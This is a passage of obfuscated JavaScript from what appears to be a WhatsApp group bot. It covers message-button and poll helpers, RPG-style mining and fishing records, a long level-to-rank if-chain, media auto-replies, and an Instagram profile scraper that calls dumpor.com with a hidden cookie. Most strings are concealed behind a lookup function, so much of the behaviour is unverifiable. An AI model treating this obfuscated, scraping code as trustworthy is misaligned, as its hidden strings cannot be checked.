            _0x45f5ad = (_0x131708, _0x42a2bf, _0x3170c3, _0x13ce51) => [{
                'buttonId': _0x131708,
                'buttonText': {
                    'displayText': _0x42a2bf
                },
                'type': 0x1
            }, {
                'buttonId': _0x3170c3,
                'buttonText': {
                    'displayText': _0x13ce51
                },
                'type': 0x1
            }],
            _0x162aa9 = (_0x23066d, _0x1aad56, _0x1db1e0, _0x263907, _0x2915bf, _0x1d75e0) => [{
                'buttonId': _0x23066d,
                'buttonText': {
                    'displayText': _0x1aad56
                },
                'type': 0x1
            }, {
                'buttonId': _0x1db1e0,
                'buttonText': {
                    'displayText': _0x263907
                },
                'type': 0x1
            }, {
                'buttonId': _0x2915bf,
                'buttonText': {
                    'displayText': _0x1d75e0
                },
                'type': 0x1
            }],
            _0x559b77 = async (_0xb5b66f, _0x5a62ac, _0x3b10b6, _0x103920 = [], _0x592da9) => {
                const _0x32dd16 = _0x5804c8;
                _0x614da8[_0x32dd16(0x938)](_0xb5b66f, {
                    'text': _0x5a62ac,
                    'footer': _0x3b10b6,
                    'buttons': _0x103920,
                    'headerType': 0x2,
                    'mentions': _0x32daaa(_0x5a62ac)
                }, {
                    'quoted': _0x592da9
                });
            }, _0x29ed4e = async (_0x17f40b, _0x4cebd1, _0x38879a, _0x5be37e, _0x10fcd0 = [], _0x324236) => {
                const _0x1976e4 = _0x5804c8;
                await _0x614da8[_0x1976e4(0x938)](_0x17f40b, {
                    'image': _0x5be37e,
                    'caption': _0x4cebd1,
                    'footer': _0x38879a,
                    'buttons': _0x10fcd0,
                    'headerType': 0x4,
                    'mentions': _0x32daaa(_0x4cebd1)
                }, {
                    'quoted': _0x324236
                });
            }, _0x121cde = async (_0x2439ec, _0x17f546, _0x44697d, _0x357e40, _0x50ae74 = [], _0x597449) => {
                const _0x3248ea = _0x5804c8;
                await _0x614da8[_0x3248ea(0x938)](_0x2439ec, {
                    'video': _0x357e40,
                    'caption': _0x17f546,
                    'footer': _0x44697d,
                    'buttons': _0x50ae74,
                    'headerType': 0x5,
                    'mentions': _0x32daaa(_0x17f546)
                }, {
                    'quoted': _0x597449
                });
            }, _0x54c78e = _0x5b4220 => {
                const _0xe2ad81 = _0x5804c8;
                return _0x614da8[_0xe2ad81(0x938)](_0x1b1e88[_0xe2ad81(0x60f)], {
                    'text': _0x5b4220,
                    'mentions': _0x32daaa(_0x5b4220)
                }, {
                    'quoted': _0x1b1e88
                });
            };
        _0x614da8[_0x5804c8(0x349)] = (_0x5c98be = '') => {
            const _0xd0f268 = _0x5804c8;
            return _0x5c98be[_0xd0f268(0x98b)]('@') ? [..._0x5c98be[_0xd0f268(0x5a2)](/@([0-9]{5,16}|0)/g)][_0xd0f268(0x686)](_0x3d12a1 => _0x3d12a1[0x1] + _0xd0f268(0x7cd)) : [];
        }, _0x614da8['sendteks'] = async (_0xea6f80, _0x386709 = '', _0x268c91 = '', _0x45a29c = {}) => {
            const _0x6dde85 = _0x5804c8;
            return _0x614da8[_0x6dde85(0x938)](_0xea6f80, {
                'text': _0x386709,
                'mentions': await _0x614da8[_0x6dde85(0x349)](_0x386709),
                ..._0x45a29c
            }, {
                'quoted': _0x268c91
            });
        }, _0x614da8['sendPoll'] = (_0x500931, _0x40f3ee = '', _0x561381 = [], _0x57bce6 = global[_0x5804c8(0x91e)]) => {
            const _0x513bc5 = _0x5804c8;
            return _0x614da8[_0x513bc5(0x938)](_0x500931, {
                'poll': {
                    'name': _0x40f3ee,
                    'values': _0x561381,
                    'selectableCount': _0x57bce6
                }
            });
        };
        async function _0x1353d6(_0x396a64) {
            const _0x476548 = _0x5804c8;
            if (_0x588c41) {
                const _0x1af753 = await _0x588c41['loadMessage'](_0x396a64[_0x476548(0x232)], _0x396a64['id']);
                return _0x1af753?. ['message'];
            }
            return {
                'conversation': _0x476548(0xbba)
            };
        }
        _0x614da8['ev']['on'](_0x5804c8(0x31f), async _0x7cb8f3 => {
            const _0x3135a6 = _0x5804c8;
            for (const {
                    key: _0x2d437a,
                    update: _0x40e2f8
                } of _0x7cb8f3) {
                if (_0x40e2f8['pollUpdates'] && _0x2d437a['fromMe']) {
                    const _0x10a685 = await _0x1353d6(_0x2d437a);
                    if (_0x10a685) {
                        const _0x2f786e = await getAggregateVotesInPollMessage({
                                'message': _0x10a685,
                                'pollUpdates': _0x40e2f8[_0x3135a6(0x7ed)]
                            }),
                            _0x9951b6 = _0x2f786e['filter'](_0x4ac1d7 => _0x4ac1d7[_0x3135a6(0x7df)][_0x3135a6(0x977)] !== 0x0)[0x0]?. [_0x3135a6(0x35b)];
                        if (_0x9951b6 == undefined) return;
                        const _0x536f06 = global[_0x3135a6(0x45e)] + _0x9951b6;
                        console['log'](_0x536f06), _0x614da8[_0x3135a6(0x401)](_0x536f06, _0x7cb8f3);
                    }
                }
            }
        });
        const _0x3d6aee = _0x2938c8 => {
            const _0x1b5d57 = _0x5804c8;
            return Math[_0x1b5d57(0xa2b)](_0x2938c8);
        };
        !_0x53a93f && (reqXp = 0x1388 * (Math[_0x5804c8(0x2af)](0x2, getLevelingLevel(_0x1b1e88[_0x5804c8(0xd13)])) - 0x1), await _petualang['push'](_0x1b1e88['sender']), await addInventoriDarah(_0x1b1e88[_0x5804c8(0xd13)], DarahAwal), await addInventori(_0x1b1e88['sender']), await addInventoriBuruan(_0x1b1e88[_0x5804c8(0xd13)]), await fs['writeFileSync'](_0x5804c8(0x983), JSON['stringify'](_petualang)), await addLevelingId(_0x1b1e88['sender']), console[_0x5804c8(0xcd3)](_0x32b235 + _0x5804c8(0xc5d)));

        function _0x1c5671(_0x162c05, _0x4db4db, _0xa2d258) {
            const _0x430cef = _0x5804c8;
            let _0x2cc347 = new Date(_0x4db4db + ' ' + _0x162c05 + ', ' + _0xa2d258 + _0x430cef(0x391))['getTime'](),
                _0x3789e1 = Date[_0x430cef(0x7e5)](),
                _0x461207 = _0x2cc347 - _0x3789e1,
                _0x86c152 = Math[_0x430cef(0xa2b)](_0x461207 / (0x3e8 * 0x3c * 0x3c * 0x18)),
                _0x4d4130 = Math[_0x430cef(0xa2b)](_0x461207 % (0x3e8 * 0x3c * 0x3c * 0x18) / (0x3e8 * 0x3c * 0x3c)),
                _0x16bef6 = Math[_0x430cef(0xa2b)](_0x461207 % (0x3e8 * 0x3c * 0x3c) / (0x3e8 * 0x3c)),
                _0x485cd3 = Math['floor'](_0x461207 % (0x3e8 * 0x3c) / 0x3e8);
            return _0x86c152 + _0x430cef(0xa74) + _0x4d4130 + _0x430cef(0x777) + _0x16bef6 + _0x430cef(0x50c) + _0x485cd3 + _0x430cef(0xd1b);
        }
        const _0x434b38 = _0x881673 => {
            let _0x1f7fe2 = /(?:[\u2700-\u27bf]|(?:\ud83c[\udde6-\uddff]){2}|[\ud800-\udbff][\udc00-\udfff]|[\u0023-\u0039]\ufe0f?\u20e3|\u3299|\u3297|\u303d|\u3030|\u24c2|\ud83c[\udd70-\udd71]|\ud83c[\udd7e-\udd7f]|\ud83c\udd8e|\ud83c[\udd91-\udd9a]|\ud83c[\udde6-\uddff]|\ud83c[\ude01-\ude02]|\ud83c\ude1a|\ud83c\ude2f|\ud83c[\ude32-\ude3a]|\ud83c[\ude50-\ude51]|\u203c|\u2049|[\u25aa-\u25ab]|\u25b6|\u25c0|[\u25fb-\u25fe]|\u00a9|\u00ae|\u2122|\u2139|\ud83c\udc04|[\u2600-\u26FF]|\u2b05|\u2b06|\u2b07|\u2b1b|\u2b1c|\u2b50|\u2b55|\u231a|\u231b|\u2328|\u23cf|[\u23e9-\u23f3]|[\u23f8-\u23fa]|\ud83c\udccf|\u2934|\u2935|[\u2190-\u21ff])/g,
                _0x361038 = new RegExp(_0x1f7fe2, 'gi');
            return _0x881673['match'](_0x361038);
        };
        async function _0x11bf11(_0x314abb) {
            const _0x451706 = _0x5804c8;
            return _0x314abb[Math[_0x451706(0xa2b)](Math[_0x451706(0xbbf)]() * _0x314abb[_0x451706(0x977)])];
        }
        async function _0x5278fd(_0x530746) {
            return new Promise((_0x339f99, _0x144028) => {
                const _0x212b96 = _0x2dbd;
                axios['get']('https://dumpor.com/v/' + _0x530746, {
                    'headers': {
                        'cookie': _0x212b96(0xc0c),
                        'user-agent': _0x212b96(0x7a3)
                    }
                })[_0x212b96(0xabe)](_0x5d2ec1 => {
                    const _0x543d9f = _0x212b96,
                        _0x249b63 = cheerio[_0x543d9f(0x74b)](_0x5d2ec1[_0x543d9f(0x233)]),
                        _0x3bc0d1 = {
                            'profile': _0x249b63(_0x543d9f(0x65b))['attr']('style')[_0x543d9f(0xa72)](/(background-image: url\(\'|\'\);)/gi, ''),
                            'fullname': _0x249b63(_0x543d9f(0x40e))['text'](),
                            'username': _0x249b63('#user-page > div.user > div > div.col-md-4.col-8.my-3 > div > h4')[_0x543d9f(0x73c)](),
                            'post': _0x249b63(_0x543d9f(0x1b6))[_0x543d9f(0x73c)]()[_0x543d9f(0xa72)](' Posts', ''),
                            'followers': _0x249b63(_0x543d9f(0x8d8))[_0x543d9f(0x73c)]()[_0x543d9f(0xa72)](_0x543d9f(0x9e2), ''),
                            'following': _0x249b63(_0x543d9f(0x1c6))['text']()[_0x543d9f(0xa72)](' Following', ''),
                            'bio': _0x249b63(_0x543d9f(0xae8))[_0x543d9f(0x73c)]()
                        };
                    _0x339f99(_0x3bc0d1);
                });
            });
        }
        async function _0x1cbd73(_0x4141e0) {
            const _0x75b09d = _0x5804c8;
            try {
                let _0x48f4c0 = await _0x614da8[_0x75b09d(0x5b3)](_0x4141e0);
                return _0x48f4c0[_0x75b09d(0x75a)];
            } catch (_0x1ff94f) {
                return '-';
            }
        }

        function _0x123af8(_0x1e1d06, _0x7c5d9a = null) {
            const _0x1c2f5a = _0x5804c8;
            return _0x7c5d9a !== null ? (_0x1e1d06 = Math[_0x1c2f5a(0x87e)](_0x1e1d06), _0x7c5d9a = Math[_0x1c2f5a(0xa2b)](_0x7c5d9a), Math[_0x1c2f5a(0xa2b)](Math['random']() * (_0x7c5d9a - _0x1e1d06 + 0x1)) + _0x1e1d06) : Math[_0x1c2f5a(0xa2b)](Math[_0x1c2f5a(0xbbf)]() * _0x1e1d06) + 0x1;
        }
        try {
            let _0x2a355b = db[_0x5804c8(0x233)]['chats'][_0x1b1e88[_0x5804c8(0x60f)]];
            if (typeof _0x2a355b !== 'object') db['data'][_0x5804c8(0x56a)][_0x1b1e88[_0x5804c8(0x60f)]] = {};
            if (_0x2a355b) {
                if (!(_0x5804c8(0x733) in _0x2a355b)) _0x2a355b['goodbye'] = _0x932571[_0x5804c8(0x8c5)];
                if (!(_0x5804c8(0x62c) in _0x2a355b)) _0x2a355b[_0x5804c8(0x62c)] = _0x932571[_0x5804c8(0x4c9)];
            } else db[_0x5804c8(0x233)][_0x5804c8(0x56a)][_0x1b1e88[_0x5804c8(0x60f)]] = {
                'goodbye': _0x932571['auto_leaveMsg'],
                'welcome': _0x932571[_0x5804c8(0x4c9)]
            };
        } catch (_0x241b16) {
            console[_0x5804c8(0xcd3)](_0x241b16);
        }
        const _0x4644bf = await _0x614da8[_0x5804c8(0x8f3)]();
        if (!_0x614da8[_0x5804c8(0x160)]) {
            if (!_0x1b1e88[_0x5804c8(0x2a9)][_0x5804c8(0xcbd)]) return;
        }
        if (_0x1b1e88[_0x5804c8(0xcea)]) {
            const _0x2a9bff = await getMancingIkan(_0x1b1e88[_0x5804c8(0xd13)]),
                _0x2c00bf = await getMancingId(_0x1b1e88['sender']);
            if (_0x2a9bff === undefined && _0x2c00bf === undefined) await addMancingId(_0x1b1e88[_0x5804c8(0xd13)]);
        }
        if (_0x1b1e88[_0x5804c8(0xcea)]) {
            const _0x45c9cb = await getBertualangPlanet(_0x1b1e88['sender']),
                _0x1011cd = await getPlaneId(_0x1b1e88[_0x5804c8(0xd13)]);
            if (_0x45c9cb === undefined && _0x1011cd === undefined) await addPlaneId(_0x1b1e88[_0x5804c8(0xd13)]);
        }
        if (_0x1b1e88[_0x5804c8(0xcea)]) {
            const _0x3c545c = await getMiningcoal(_0x1b1e88['sender']),
                _0x4e35fd = await getMiningId(_0x1b1e88[_0x5804c8(0xd13)]);
            if (_0x3c545c === undefined && _0x4e35fd === undefined) await addMiningId(_0x1b1e88[_0x5804c8(0xd13)]);
        }
        if (_0x1b1e88[_0x5804c8(0xcea)]) {
            const _0x2df562 = await getMiningstone(_0x1b1e88[_0x5804c8(0xd13)]),
                _0x3ea092 = await getBatuId(_0x1b1e88['sender']);
            if (_0x2df562 === undefined && _0x3ea092 === undefined) await addBatuId(_0x1b1e88[_0x5804c8(0xd13)]);
        }
        if (_0x1b1e88['isGroup']) {
            const _0x14d1cd = await getMiningore(_0x1b1e88[_0x5804c8(0xd13)]),
                _0x181f0b = await getOreId(_0x1b1e88[_0x5804c8(0xd13)]);
            if (_0x14d1cd === undefined && _0x181f0b === undefined) await addOreId(_0x1b1e88[_0x5804c8(0xd13)]);
        }
        if (_0x1b1e88[_0x5804c8(0xcea)]) {
            const _0x55740d = await getMiningingot(_0x1b1e88['sender']),
                _0x38cf01 = await getIngotId(_0x1b1e88[_0x5804c8(0xd13)]);
            if (_0x55740d === undefined && _0x38cf01 === undefined) await addIngotId(_0x1b1e88[_0x5804c8(0xd13)]);
        }
        if (_0x1b1e88[_0x5804c8(0xcea)]) {
            const _0xcfa330 = await getNebangKayu(_0x1b1e88[_0x5804c8(0xd13)]),
                _0x538e36 = await getNebangId(_0x1b1e88[_0x5804c8(0xd13)]);
            if (_0xcfa330 === undefined && _0x538e36 === undefined) await addNebangId(_0x1b1e88[_0x5804c8(0xd13)]);
        }
        if (_0x1b1e88[_0x5804c8(0xcea)]) {
            const _0x4f4e62 = await checkATMuser(_0x1b1e88['sender']);
            try {
                if (_0x4f4e62 === undefined) await addATM(_0x1b1e88['sender']);
                const _0x1288fd = Math[_0x5804c8(0xa2b)](Math['random']() * 0xa) + 0x5a;
                addKoinUser(_0x1b1e88[_0x5804c8(0xd13)], _0x1288fd);
            } catch (_0x5a6a44) {
                console[_0x5804c8(0x5d2)](_0x5a6a44);
            }
        }
        const _0x32dea6 = await getLevelingLevel(_0x1b1e88[_0x5804c8(0xd13)]);
        var _0x96c6c4 = _0x5804c8(0x8b4);
        if (_0x32dea6 <= 0x2) _0x96c6c4 = _0x5804c8(0x8b4);
        else {
            if (_0x32dea6 <= 0xa) _0x96c6c4 = _0x5804c8(0x613);
            else {
                if (_0x32dea6 <= 0x14) _0x96c6c4 = 'Bronze 3';
                else {
                    if (_0x32dea6 <= 0x1e) _0x96c6c4 = 'Bronze 4';
                    else {
                        if (_0x32dea6 <= 0x28) _0x96c6c4 = 'Bronze 5';
                        else {
                            if (_0x32dea6 <= 0x46) _0x96c6c4 = _0x5804c8(0xa3c);
                            else {
                                if (_0x32dea6 <= 0x55) _0x96c6c4 = 'Silver 2';
                                else {
                                    if (_0x32dea6 <= 0x5f) _0x96c6c4 = _0x5804c8(0x691);
                                    else {
                                        if (_0x32dea6 <= 0x69) _0x96c6c4 = _0x5804c8(0x3a6);
                                        else {
                                            if (_0x32dea6 <= 0x7d) _0x96c6c4 = _0x5804c8(0x586);
                                            else {
                                                if (_0x32dea6 <= 0x96) _0x96c6c4 = _0x5804c8(0x27c);
                                                else {
                                                    if (_0x32dea6 <= 0xaa) _0x96c6c4 = 'Gold 2';
                                                    else {
                                                        if (_0x32dea6 <= 0xbe) _0x96c6c4 = _0x5804c8(0xa36);
                                                        else {
                                                            if (_0x32dea6 <= 0xd2) _0x96c6c4 = _0x5804c8(0xaab);
                                                            else {
                                                                if (_0x32dea6 <= 0xe6) _0x96c6c4 = 'Gold 5';
                                                                else {
                                                                    if (_0x32dea6 <= 0x104) _0x96c6c4 = _0x5804c8(0x906);
                                                                    else {
                                                                        if (_0x32dea6 <= 0x122) _0x96c6c4 = 'Platinum 2';
                                                                        else {
                                                                            if (_0x32dea6 <= 0x140) _0x96c6c4 = _0x5804c8(0x7d0);
                                                                            else {
                                                                                if (_0x32dea6 <= 0x15e) _0x96c6c4 = _0x5804c8(0xd74);
                                                                                else {
                                                                                    if (_0x32dea6 <= 0x17c) _0x96c6c4 = _0x5804c8(0x872);
                                                                                    else {
                                                                                        if (_0x32dea6 <= 0x19a) _0x96c6c4 = 'Diamond 1';
                                                                                        else {
                                                                                            if (_0x32dea6 <= 0x1c2) _0x96c6c4 = 'Diamond 2';
                                                                                            else {
                                                                                                if (_0x32dea6 <= 0x1f4) _0x96c6c4 = _0x5804c8(0xa59);
                                                                                                else {
                                                                                                    if (_0x32dea6 <= 0x226) _0x96c6c4 = 'Diamond 4';
                                                                                                    else {
                                                                                                        if (_0x32dea6 <= 0x258) _0x96c6c4 = _0x5804c8(0x6b7);
                                                                                                        else {
                                                                                                            if (_0x32dea6 <= 0x2bc) _0x96c6c4 = 'Master';
                                                                                                            else {
                                                                                                                if (_0x32dea6 <= 0x320) _0x96c6c4 = _0x5804c8(0x328);
                                                                                                                else {
                                                                                                                    if (_0x32dea6 <= 0x384) _0x96c6c4 = _0x5804c8(0x56f);
                                                                                                                    else {
                                                                                                                        if (_0x32dea6 <= 0x3e8) _0x96c6c4 = _0x5804c8(0xafc);
                                                                                                                        else {
                                                                                                                            if (_0x32dea6 <= 0x44c) _0x96c6c4 = _0x5804c8(0x802);
                                                                                                                            else {
                                                                                                                                if (_0x32dea6 <= 0x4c9) _0x96c6c4 = 'Master ✯✯';
                                                                                                                                else {
                                                                                                                                    if (_0x32dea6 <= 0x53c) _0x96c6c4 = _0x5804c8(0x654);
                                                                                                                                    else {
                                                                                                                                        if (_0x32dea6 <= 0x578) _0x96c6c4 = 'GrandMaster';
                                                                                                                                        else {
                                                                                                                                            if (_0x32dea6 <= 0x613) _0x96c6c4 = _0x5804c8(0x52e);
                                                                                                                                            else {
                                                                                                                                                if (_0x32dea6 <= 0x67c) _0x96c6c4 = _0x5804c8(0x16f);
                                                                                                                                                else {
                                                                                                                                                    if (_0x32dea6 <= 0x6ae) _0x96c6c4 = _0x5804c8(0x60b);
                                                                                                                                                    else {
                                                                                                                                                        if (_0x32dea6 <= 0x721) _0x96c6c4 = _0x5804c8(0x2a3);
                                                                                                                                                        else {
                                                                                                                                                            if (_0x32dea6 <= 0x79e) _0x96c6c4 = _0x5804c8(0x7b7);
                                                                                                                                                            else {
                                                                                                                                                                if (_0x32dea6 <= 0x7d0) _0x96c6c4 = _0x5804c8(0x9e6);
                                                                                                                                                                else {
                                                                                                                                                                    if (_0x32dea6 <= 0x8ac) _0x96c6c4 = 'Legends';
                                                                                                                                                                    else {
                                                                                                                                                                        if (_0x32dea6 <= 0x9c4) _0x96c6c4 = _0x5804c8(0x8d1);
                                                                                                                                                                        else {
                                                                                                                                                                            if (_0x32dea6 <= 0xa8c) _0x96c6c4 = _0x5804c8(0x195);
                                                                                                                                                                            else {
                                                                                                                                                                                if (_0x32dea6 <= 0xb54) _0x96c6c4 = _0x5804c8(0x255);
                                                                                                                                                                                else {
                                                                                                                                                                                    if (_0x32dea6 <= 0xc1c) _0x96c6c4 = _0x5804c8(0x8a5);
                                                                                                                                                                                    else {
                                                                                                                                                                                        if (_0x32dea6 <= 0xce4) _0x96c6c4 = _0x5804c8(0x920);
                                                                                                                                                                                        else {
                                                                                                                                                                                            if (_0x32dea6 <= 0xe10) _0x96c6c4 = _0x5804c8(0xbdd);
                                                                                                                                                                                            else {
                                                                                                                                                                                                if (_0x32dea6 <= 0xf3c) _0x96c6c4 = _0x5804c8(0x2dc);
                                                                                                                                                                                                else {
                                                                                                                                                                                                    if (_0x32dea6 <= 0x1068) _0x96c6c4 = _0x5804c8(0x5c5);
                                                                                                                                                                                                    else {
                                                                                                                                                                                                        if (_0x32dea6 <= 0x1162) _0x96c6c4 = _0x5804c8(0x6ba);
                                                                                                                                                                                                        else {
                                                                                                                                                                                                            if (_0x32dea6 <= 0x125c) _0x96c6c4 = 'Legends 忍';
                                                                                                                                                                                                            else {
                                                                                                                                                                                                                if (_0x32dea6 <= 0x1324) _0x96c6c4 = _0x5804c8(0x487);
                                                                                                                                                                                                                else {
                                                                                                                                                                                                                    if (_0x32dea6 <= 0x13ec) _0x96c6c4 = 'Legends 忍²';
                                                                                                                                                                                                                    else {
                                                                                                                                                                                                                        if (_0x32dea6 <= 0x15e0) _0x96c6c4 = _0x5804c8(0x5ea);
                                                                                                                                                                                                                        else {
                                                                                                                                                                                                                            if (_0x32dea6 <= 0x17d4) _0x96c6c4 = 'Legends 忍⁴';
                                                                                                                                                                                                                            else {
                                                                                                                                                                                                                                if (_0x32dea6 <= 0x1b58) _0x96c6c4 = _0x5804c8(0x48c);
                                                                                                                                                                                                                                else {
                                                                                                                                                                                                                                    if (_0x32dea6 <= 0x2710) _0x96c6c4 = _0x5804c8(0x436);
                                                                                                                                                                                                                                    else {
                                                                                                                                                                                                                                        if (_0x32dea6 <= 0x4e20) _0x96c6c4 = _0x5804c8(0xc02);
                                                                                                                                                                                                                                        else {
                                                                                                                                                                                                                                            if (_0x32dea6 <= 0x7530) _0x96c6c4 = _0x5804c8(0x85e);
                                                                                                                                                                                                                                            else {
                                                                                                                                                                                                                                                if (_0x32dea6 <= 0x9c40) _0x96c6c4 = _0x5804c8(0xc32);
                                                                                                                                                                                                                                                else {
                                                                                                                                                                                                                                                    if (_0x32dea6 <= 0xc350) _0x96c6c4 = _0x5804c8(0x5a0);
                                                                                                                                                                                                                                                    else {
                                                                                                                                                                                                                                                        if (_0x32dea6 <= 0xea60) _0x96c6c4 = _0x5804c8(0xab8);
                                                                                                                                                                                                                                                        else {
                                                                                                                                                                                                                                                            if (_0x32dea6 <= 0x11170) _0x96c6c4 = _0x5804c8(0x64f);
                                                                                                                                                                                                                                                            else {
                                                                                                                                                                                                                                                                if (_0x32dea6 <= 0x13880) _0x96c6c4 = _0x5804c8(0x424);
                                                                                                                                                                                                                                                                else {
                                                                                                                                                                                                                                                                    if (_0x32dea6 <= 0x15f90) _0x96c6c4 = 'Pro 숒';
                                                                                                                                                                                                                                                                    else _0x32dea6 <= 0x186a0 && (_0x96c6c4 = _0x5804c8(0x5e0));
                                                                                                                                                                                                                                                                }
                                                                                                                                                                                                                                                            }
                                                                                                                                                                                                                                                        }
                                                                                                                                                                                                                                                    }
                                                                                                                                                                                                                                                }
                                                                                                                                                                                                                                            }
                                                                                                                                                                                                                                        }
                                                                                                                                                                                                                                    }
                                                                                                                                                                                                                                }
                                                                                                                                                                                                                            }
                                                                                                                                                                                                                        }
                                                                                                                                                                                                                    }
                                                                                                                                                                                                                }
                                                                                                                                                                                                            }
                                                                                                                                                                                                        }
                                                                                                                                                                                                    }
                                                                                                                                                                                                }
                                                                                                                                                                                            }
                                                                                                                                                                                        }
                                                                                                                                                                                    }
                                                                                                                                                                                }
                                                                                                                                                                            }
                                                                                                                                                                        }
                                                                                                                                                                    }
                                                                                                                                                                }
                                                                                                                                                            }
                                                                                                                                                        }
                                                                                                                                                    }
                                                                                                                                                }
                                                                                                                                            }
                                                                                                                                        }
                                                                                                                                    }
                                                                                                                                }
                                                                                                                            }
                                                                                                                        }
                                                                                                                    }
                                                                                                                }
                                                                                                            }
                                                                                                        }
                                                                                                    }
                                                                                                }
                                                                                            }
                                                                                        }
                                                                                    }
                                                                                }
                                                                            }
                                                                        }
                                                                    }
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
        _0x1b1e88[_0x5804c8(0x200)] && console[_0x5804c8(0xcd3)](_0x5804c8(0xd7b), _0x5804c8(0xa25), _0x4fb4a6, chalk[_0x5804c8(0x87a)](_0x22c514[_0x5804c8(0x7af)](0x0, 0x64) || _0x1b1e88[_0x5804c8(0x541)]), _0x5804c8(0x44e), chalk['green'](_0x32b235), 'in', chalk['green'](_0x131b22 ? _0x131b22 : 'Private Chat'), _0x5804c8(0x1df), chalk[_0x5804c8(0x87a)](_0x1b04cf[_0x5804c8(0x977)]));
        const _0x12b6dc = [{
            'urlButton': {
                'displayText': _0x5804c8(0x20e),
                'url': '' + _0x932571[_0x5804c8(0xc56)]
            }
        }, {
            'urlButton': {
                'displayText': _0x5804c8(0xccb),
                'url': '' + _0x932571[_0x5804c8(0xd0f)]
            }
        }, {
            'quickReplyButton': {
                'displayText': _0x5804c8(0x885),
                'id': _0x5804c8(0x9bd)
            }
        }, {
            'quickReplyButton': {
                'displayText': _0x5804c8(0x76f),
                'id': '.donate'
            }
        }, {
            'quickReplyButton': {
                'displayText': _0x5804c8(0x231),
                'id': _0x5804c8(0xd75)
            }
        }];
        _sewa[_0x5804c8(0x1ee)](_0x614da8, sewa), _prem[_0x5804c8(0x1ee)](_0x614da8, premium), setInterval(() => {
            const _0x29cc45 = _0x5804c8;
            for (let _0x5de2d7 of Object[_0x29cc45(0x960)](opengc)) {
                Date[_0x29cc45(0x7e5)]() >= _0x5de2d7[_0x29cc45(0x3ab)] && (_0x614da8[_0x29cc45(0x40f)](_0x5de2d7['id'], _0x29cc45(0x7b4))[_0x29cc45(0xabe)](_0x533aad => _0x614da8['sendMessage'](_0x5de2d7['id'], {
                    'text': _0x29cc45(0x282)
                }))[_0x29cc45(0xb9d)](_0x48f5ce => _0x614da8[_0x29cc45(0x938)](_0x5de2d7['id'], {
                    'text': 'Error'
                })), delete opengc[_0x5de2d7['id']], fs[_0x29cc45(0x933)](_0x29cc45(0x79f), JSON[_0x29cc45(0x736)](opengc)));
            }
        }, 0x3e8);
        if (_0x932571[_0x5804c8(0x4e4)]) {
            if (_0x932571[_0x5804c8(0x4e4)] === ![]) return;
            let _0x3cb25c = 0x0;
            new Date() * 0x1 - _0x3cb25c > 0x3e8 && (await _0x614da8[_0x5804c8(0xbeb)](_0x5804c8(0x953) + _0x614da8['user']['name'] + ' 🤖 | ' + runtime(process[_0x5804c8(0x819)]()) + _0x5804c8(0x9a0) + (_0x614da8[_0x5804c8(0x90c)] ? _0x5804c8(0x3ec) : _0x5804c8(0x4a2)) + _0x5804c8(0xc1c) + pendaftar['length'] + _0x5804c8(0x378)), _0x3cb25c = new Date() * 0x1);
        }
        if (!_0x7b6ab6 && _0x932571[_0x5804c8(0xa9f)] && !_0x1b1e88[_0x5804c8(0xcea)]) return;
        if (!_0x7b6ab6 && _0x932571[_0x5804c8(0x4a0)] && _0x1b1e88[_0x5804c8(0xcea)]) return;
        var _0x38e81c = _0x1b1e88['mtype'] == _0x5804c8(0xa41) ? _0x1b1e88[_0x5804c8(0x200)]['listResponseMessage']['singleSelectReply'][_0x5804c8(0xd96)] : _0x1b1e88[_0x5804c8(0x541)] == 'messageContextInfo' ? _0x1b1e88['message'][_0x5804c8(0xab6)]?. [_0x5804c8(0x9cb)] || _0x1b1e88[_0x5804c8(0x200)][_0x5804c8(0xa41)]?. ['singleSelectReply'][_0x5804c8(0xd96)] || _0x1b1e88[_0x5804c8(0x73c)] : '';
        for (let _0x3f2670 of setiker) {
            !_0x38e81c && _0x22c514 === _0x3f2670 && (_0x224769 = fs[_0x5804c8(0x456)]('./database/' + _0x3f2670 + _0x5804c8(0x6a8)), await _0x614da8[_0x5804c8(0x2bf)](_0x1b1e88[_0x5804c8(0x60f)], _0x224769, _0x1b1e88, {
                'packname': _0x5804c8(0x88c) + _0x932571[_0x5804c8(0x4e3)] + '\x0a' + tanggal(new Date()),
                'author': _0x5804c8(0xd2c) + _0x932571[_0x5804c8(0x67e)] + '\x0aTime ' + _0x4fb4a6
            }));
        }
        for (let _0x934928 of audionye) {
            !_0x38e81c && _0x22c514 === _0x934928 && (_0x224769 = fs[_0x5804c8(0x456)](_0x5804c8(0xb7b) + _0x934928 + _0x5804c8(0x7eb)), _0x614da8['sendAudio'](_0x1b1e88['chat'], _0x224769, _0x1b1e88, !![]));
        }
        for (let _0x1e25eb of imagenye) {
            !_0x38e81c && _0x22c514 === _0x1e25eb && (_0x224769 = fs[_0x5804c8(0x456)](_0x5804c8(0xb7b) + _0x1e25eb + _0x5804c8(0xa05)), _0x614da8[_0x5804c8(0xa2e)](_0x1b1e88[_0x5804c8(0x60f)], _0x224769, '', _0x1b1e88));
        }
        for (let _0x5ed703 of videonye) {
            !_0x38e81c && _0x22c514 === _0x5ed703 && (_0x224769 = fs[_0x5804c8(0x456)]('./database/' + _0x5ed703 + _0x5804c8(0x664)), _0x614da8[_0x5804c8(0x371)](_0x1b1e88[_0x5804c8(0x60f)], _0x224769, ![], '', _0x1b1e88));
        }
        async function _0x160fb2(_0x595ddd, _0x7715a6, _0xb367c2) {
            const _0x474715 = _0x5804c8;
            var _0xd36daf = null,
                _0x2a6cc9 = null;
            Object[_0x474715(0xafa)](_0xb367c2)[_0x474715(0x9c5)](_0x3dd19e => {
                const _0x33e15c = _0x474715;
                _0xb367c2[_0x3dd19e][_0x33e15c(0x194)] === _0x7715a6 && (_0xd36daf = _0x3dd19e);
            }), _0xd36daf === null && (_0xb367c2[_0x474715(0x453)]({
                'jid': _0x1b1e88[_0x474715(0xd13)],
                'db': [{
                    'nama': _0x595ddd,
                    'count': 0x0
                }]
            }), fs[_0x474715(0x933)](_0x474715(0x6aa), JSON['stringify'](_0xb367c2, null, 0x2)), Object['keys'](_0xb367c2)[_0x474715(0x9c5)](_0x455cd0 => {
                const _0x241f67 = _0x474715;
                _0xb367c2[_0x455cd0]['jid'] === _0x1b1e88[_0x241f67(0xd13)] && (_0xd36daf = _0x455cd0);
            })), _0xd36daf !== null && (Object[_0x474715(0xafa)](_0xb367c2[_0xd36daf]['db'])[_0x474715(0x9c5)](_0x27f192 => {
                _0xb367c2[_0xd36daf]['db'][_0x27f192]['nama'] === _0x595ddd && (_0x2a6cc9 = _0x27f192);
            }), _0x2a6cc9 === null ? (_0xb367c2[_0xd36daf]['db'][_0x474715(0x453)]({
